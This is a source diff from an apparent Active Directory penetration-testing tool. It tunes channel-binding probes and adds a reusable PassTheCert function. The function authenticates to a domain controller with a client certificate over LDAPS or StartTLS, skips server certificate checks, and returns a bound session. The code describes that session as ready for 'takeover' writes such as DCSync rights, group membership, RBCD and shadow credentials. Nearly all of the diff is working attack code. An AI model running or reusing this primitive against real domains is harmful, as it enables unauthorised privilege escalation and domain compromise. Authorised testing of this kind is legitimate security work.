@@ -3339,20 +3339,23 @@ async def async_connect_with_ldap_fallback(
                 if hasattr(conn, "_disable_signing"):
                     conn._disable_signing = not cfg.sign
                 if hasattr(conn, "_disable_channel_binding"):
-                    # CBT is driven solely by ``cfg.channel_binding`` so an explicit
-                    # CBT requirement (e.g. a SEC_E_BAD_BINDINGS self-heal retry, or
-                    # the operational LDAPS default-on set by
-                    # ``_apply_default_cbt_to_authenticated_ldaps``) is never silently
-                    # dropped. On a StartTLS rung the vendor cb_data computation is
-                    # gated on ``protocol == CLIENT_SSL_TCP`` (true LDAPS only), so a
-                    # non-LDAPS StartTLS connection never derives a token regardless
-                    # of this flag -- meaning we do NOT need to force-disable CBT for
-                    # StartTLS here, and doing so would defeat an explicit CBT-required
-                    # retry that lands on an LDAPS rung. ``channel_binding`` is left at
-                    # its False default for StartTLS/plain rungs (see
-                    # ``_apply_default_cbt_to_authenticated_ldaps``, which skips them),
-                    # so this stays a no-op there.
-                    conn._disable_channel_binding = not cfg.channel_binding
+                    # Keep the vendor CBT machinery ENABLED whenever this rung wants
+                    # to send a token at all -- either the real one
+                    # (``channel_binding=True``: a SEC_E_BAD_BINDINGS self-heal retry
+                    # or the operational LDAPS default-on from
+                    # ``_apply_default_cbt_to_authenticated_ldaps``) OR a deliberately
+                    # wrong one (``null_channel_binding=True``: the posture CBT step-2
+                    # probe). The vendor computes cb_data only while
+                    # ``_disable_channel_binding is False``, so disabling it on the
+                    # null-CBT probe would make the empty-SHA256 branch unreachable and
+                    # mis-measure the LDAP_CHANNEL_BINDING "When Supported" policy as
+                    # DISABLED. CBT is now derived on BOTH LDAPS (connect()) and
+                    # StartTLS (starttls()) rungs by the vendor, so this flag governs
+                    # both; it stays a no-op on a plain-389 rung with neither flag set
+                    # (no TLS channel, nothing to derive).
+                    conn._disable_channel_binding = not (
+                        cfg.channel_binding or cfg.null_channel_binding
+                    )
                 if hasattr(conn, "_null_channel_binding"):
                     conn._null_channel_binding = cfg.null_channel_binding
                 if hasattr(conn, "_use_starttls"):
@@ -4068,3 +4071,280 @@ def anonymous_default_naming_context(client: Any) -> str:
         if isinstance(ncs, list) and ncs:
             base_dn = str(ncs[0])
     return base_dn.strip()
+
+
+# ---------------------------------------------------------------------------
+# Schannel / EXTERNAL LDAPS client-certificate bind (PassTheCert primitive)
+# ---------------------------------------------------------------------------
+#
+# A REUSABLE cert->LDAP authentication seam for ANY escalation that
+# authenticates with a certificate over Schannel (ESC15 method A, PassTheCert
+# generally), NOT an ESC15 special case. The client certificate is presented in
+# the TLS handshake and Active Directory maps it to the account on the SASL
+# EXTERNAL bind (the vendor bind path in badldap connection.py; locked by
+# tests/unit/vendor/test_badldap_schannel_external_bind.py).
+#
+# NEEDS A TLS CHANNEL, NOT NECESSARILY LDAPS: Schannel cert auth cannot run over
+# plaintext 389, but BOTH LDAPS(636) AND StartTLS-over-389 provide the TLS
+# channel that carries the client certificate. So there is a posture-driven TLS
+# ladder here (LDAPS first, StartTLS-on-389 second), NOT a plaintext downgrade:
+#   1. LDAPS(636)        — implicit TLS, the client cert is in the TLS handshake.
+#   2. StartTLS(389)     — the vendor SSL-credential bind path raises TLS via
+#                          StartTLS (RFC 2830) on a plain-389 CLIENT_TCP target,
+#                          presenting the SAME client cert, then binds EXTERNAL.
+# LDAP sign+seal is NOT a rung: GSSAPI sign+seal is confidentiality over
+# plaintext 389 authenticated by a Kerberos/NTLM credential and presents NO
+# client cert, so it cannot carry a cert bind. Only if NEITHER TLS path exists
+# is the cert-bind unavailable (an honest data gap) and the caller falls back to
+# a non-Schannel method (e.g. ESC15 method B).
+
+
+class SchannelBindError(Exception):
+    """A Schannel/EXTERNAL LDAPS client-certificate bind failed."""
+
+
+class SchannelLdapsUnavailable(SchannelBindError):
+    """No TLS channel (LDAPS or StartTLS) is available for a Schannel cert-bind.
+
+    Distinct from a bind REJECTION (unmapped / revoked cert): this is the
+    "method A is not even possible here" data gap — the certificate was never
+    even presented to AD for mapping, because no TLS channel could be raised. It
+    routes a caller to its non-Schannel fallback (e.g. ESC15 method B), and is
+    NEVER a claim about the cert itself.
+    """
+
+
+# Result codes the DC returns when it refuses the StartTLS extended operation
+# itself (the TLS channel could not be raised), as opposed to refusing the
+# EXTERNAL bind afterwards (the cert mapping). A StartTLS refusal means the cert
+# was never presented to AD, so it is a channel data gap (SchannelLdapsUnavailable),
+# never a claim about the cert.
+_STARTTLS_REFUSAL_RESULTNAMES = frozenset(
+    {
+        "protocolError",
+        "unwillingToPerform",
+        "unavailable",
+        "operationsError",
+        "confidentialityRequired",
+    }
+)
+
+
+def _is_schannel_channel_unavailable(err: BaseException | None) -> bool:
+    """Whether a failed Schannel bind is a TLS-channel data gap (not a cert claim).
+
+    True when the connect/TLS transport failed, OR when the DC refused the
+    StartTLS extended operation (so the cert never reached AD for mapping).
+    False for an EXTERNAL-bind rejection (AD saw the cert and refused it).
+    """
+    if err is None:
+        return False
+    if is_ldaps_transport_failure(err):
+        return True
+    for candidate in _walk_exception_chain(err):
+        resultname = getattr(candidate, "resultname", None)
+        if isinstance(resultname, str) and resultname in _STARTTLS_REFUSAL_RESULTNAMES:
+            return True
+    return False
+
+
+async def async_schannel_cert_bind(
+    *,
+    dc_ip: str,
+    pfx_path: str,
+    pfx_password: str = "",
+    dc_fqdn: str | None = None,
+    domain: str | None = None,
+    port: int = 636,
+    starttls_port: int = 389,
+    timeout: float = 15.0,
+    posture_snapshot: Any = None,
+):
+    """Bind as a certificate's identity via Schannel / SASL EXTERNAL over TLS.
+
+    The reusable native PassTheCert primitive. Builds a target whose TLS context
+    presents the client certificate from ``pfx_path``, binds SASL EXTERNAL (AD
+    maps the channel cert to the account), and returns the live, authenticated
+    ``MSLDAPClient`` ready for the LDAP-level takeover (``add_priv_dcsync`` /
+    ``add_priv_addmember`` / RBCD / shadow-cred writes).
+
+    Posture-driven TLS ladder (the cert needs a TLS channel, not specifically
+    LDAPS): try LDAPS(636) first; if 636 is unavailable but StartTLS-on-389 is,
+    raise TLS via StartTLS on a plain-389 connection and run the SAME EXTERNAL
+    cert bind over it (the vendor SSL-credential bind path does the StartTLS
+    upgrade and presents the same client cert). Only when NEITHER TLS path
+    exists is :class:`SchannelLdapsUnavailable` raised so the caller falls back
+    to a non-Schannel method. LDAP sign+seal is NOT a rung (it carries no cert).
+
+    IP for the connect, FQDN for the channel: ``dc_ip`` is the reachable connect
+    target (resolve it via ``host_address_resolver`` before calling), ``dc_fqdn``
+    is kept as the TLS server name (consistent with the Kerberos-SPN split).
+
+    Args:
+        dc_ip: Reachable IP of the DC to connect to.
+        pfx_path: Path to the client-auth PFX (cert + key) to present.
+        pfx_password: PFX password (empty when the PFX is unencrypted).
+        dc_fqdn: DC FQDN for the TLS server name (optional).
+        domain: Target domain (metadata; TLS is not verified).
+        port: LDAPS port (default 636).
+        starttls_port: Plain LDAP port for the StartTLS rung (default 389).
+        timeout: Per-rung connect budget in seconds (generous for VPN RTT).
+        posture_snapshot: Optional posture snapshot. A rung whose TLS channel the
+            posture reports DISABLED is skipped; when BOTH LDAPS and StartTLS are
+            known-unavailable the bind is skipped with
+            :class:`SchannelLdapsUnavailable`. A transient/unknown posture never
+            skips a rung (observe, never infer-by-absence).
+
+    Returns:
+        A connected, EXTERNAL-bound ``MSLDAPClient``.
+
+    Raises:
+        SchannelLdapsUnavailable: no TLS channel (LDAPS or StartTLS) is available.
+        SchannelBindError: a TLS channel was raised but the EXTERNAL bind failed
+            (e.g. AD refused the certificate mapping), or the native stack is
+            missing.
+    """
+    # Posture: skip a rung only when its TLS channel is KNOWN-unavailable. A
+    # transient/unknown posture must not prune a rung (observe, never
+    # infer-by-absence) — the empirical attempt below settles it.
+    ldaps_known_disabled = False
+    starttls_known_disabled = False
+    if posture_snapshot is not None:
+        try:
+            from adscan_internal.services.domain_posture import (  # noqa: PLC0415
+                ConstraintCategory,
+                TriState,
+            )
+
+            ldaps_known_disabled = (
+                posture_snapshot.get(
+                    ConstraintCategory.LDAPS_AVAILABLE
+                ).effective_state
+                is TriState.DISABLED
+            )
+            starttls_known_disabled = (
+                posture_snapshot.get(
+                    ConstraintCategory.LDAP_STARTTLS_AVAILABLE
+                ).effective_state
+                is TriState.DISABLED
+            )
+        except Exception:  # noqa: BLE001 — posture read is advisory
+            ldaps_known_disabled = False
+            starttls_known_disabled = False
+
+    if ldaps_known_disabled and starttls_known_disabled:
+        raise SchannelLdapsUnavailable(
+            "neither LDAPS (636) nor StartTLS (389) is available on the DC; "
+            "Schannel certificate bind cannot run (method A unavailable)"
+        )
+
+    try:
+        from asysocks.unicomm.common.target import UniProto  # noqa: PLC0415
+        from asysocks.unicomm.common.unissl import UniSSL  # noqa: PLC0415
+        from badauth.common.constants import asyauthProtocol  # noqa: PLC0415
+        from badauth.common.credentials import UniCredential  # noqa: PLC0415
+        from badldap.client import MSLDAPClient  # noqa: PLC0415
+        from badldap.commons.target import MSLDAPTarget  # noqa: PLC0415
+    except Exception as exc:  # noqa: BLE001
+        raise SchannelBindError(
+            f"native Schannel stack unavailable: {type(exc).__name__}: {exc}"
+        ) from exc
+
+    hostname = (dc_fqdn or "").strip() or None
+    # Present the client certificate in the TLS handshake (LDAPS) or the StartTLS
+    # upgrade. UniSSL accepts a PFX path for both the cert and the key (it splits
+    # it to PEM internally) and defaults to verify=False, so the DC's own
+    # certificate is not verified (Schannel cares about the CLIENT cert, not the
+    # server cert). Channel-independent, so built once and reused across rungs.
+    ssl_ctx = UniSSL(
+        certfile=pfx_path,
+        keyfile=pfx_path,
+        password=pfx_password or None,
+        verify=False,
+    )
+
+    async def _attempt(label: str, protocol: Any, connect_port: int):
+        """Run the EXTERNAL cert bind over ONE TLS channel.
+
+        LDAPS uses ``CLIENT_SSL_TCP`` (implicit TLS). StartTLS uses ``CLIENT_TCP``
+        on the plain port: the vendor SSL-credential bind path raises the TLS
+        channel via StartTLS (presenting the same ``ssl_ctx`` client cert) and
+        then binds EXTERNAL over it. ``_use_starttls`` is deliberately NOT set —
+        that would StartTLS twice (once in ``connect()``, once in the SSL bind
+        path); the SSL bind path owns the upgrade for the cert credential.
+        """
+        target = MSLDAPTarget(
+            ip=dc_ip,
+            port=connect_port,
+            protocol=protocol,
+            hostname=hostname,
+            domain=domain,
+            dc_ip=dc_ip,
+            timeout=timeout,
+            ssl_ctx=ssl_ctx,
+        )
+        credential = UniCredential(protocol=asyauthProtocol.SSL)
+        client = MSLDAPClient(target, credential)
+        # Schannel cert auth has NO GSS layer: channel binding and SASL sign/seal
+        # do not apply, so disable the CBT/seal machinery (nothing to derive on a
+        # cert-only bind).
+        client._disable_channel_binding = True
+        client._disable_signing = True
+
+        marked_dc = mark_sensitive(dc_fqdn or dc_ip, "hostname")
+        print_info_debug(
+            f"[ldap_transport] Schannel/EXTERNAL {label} cert-bind to "
+            f"{marked_dc} on {dc_ip}:{connect_port}"
+        )
+        try:
+            ok, err = await asyncio.wait_for(client.connect(), timeout=timeout)
+        except asyncio.TimeoutError as exc:
+            raise SchannelLdapsUnavailable(
+                f"{label} connect to {dc_ip}:{connect_port} timed out; "
+                "Schannel cert-bind cannot run over this channel"
+            ) from exc
+        except Exception as exc:  # noqa: BLE001
+            if _is_schannel_channel_unavailable(exc):
+                raise SchannelLdapsUnavailable(
+                    f"{label} transport failed on {dc_ip}:{connect_port}; "
+                    "Schannel cert-bind cannot run over this channel"
+                ) from exc
+            raise SchannelBindError(
+                f"Schannel {label} cert-bind raised {type(exc).__name__}: {exc}"
+            ) from exc
+
+        if not ok:
+            if _is_schannel_channel_unavailable(err):
+                raise SchannelLdapsUnavailable(
+                    f"{label} transport failed on {dc_ip}:{connect_port}; "
+                    "Schannel cert-bind cannot run over this channel"
+                ) from err
+            raise SchannelBindError(
+                f"Schannel {label} cert-bind failed "
+                f"(AD refused the certificate mapping): {err}"
+            )
+        return client
+
+    # Build the TLS ladder, strongest first. The both-known-disabled case already
+    # raised, so this is always non-empty.
+    rungs: list[tuple[str, Any, int]] = []
+    if not ldaps_known_disabled:
+        rungs.append(("LDAPS", UniProto.CLIENT_SSL_TCP, port))
+    if not starttls_known_disabled:
+        rungs.append(("StartTLS", UniProto.CLIENT_TCP, starttls_port))
+
+    last_unavailable: SchannelLdapsUnavailable | None = None
+    for label, protocol, connect_port in rungs:
+        try:
+            return await _attempt(label, protocol, connect_port)
+        except SchannelLdapsUnavailable as exc:
+            # This TLS channel is unavailable — fall through to the next rung. A
+            # SchannelBindError (the cert WAS presented and AD refused it) is not
+            # caught here and propagates immediately: a different TLS channel
+            # would present the same cert to the same AD and be refused again.
+            last_unavailable = exc
+            continue
+
+    raise last_unavailable or SchannelLdapsUnavailable(
+        "no TLS channel (LDAPS or StartTLS) available for a Schannel cert-bind"
+    )
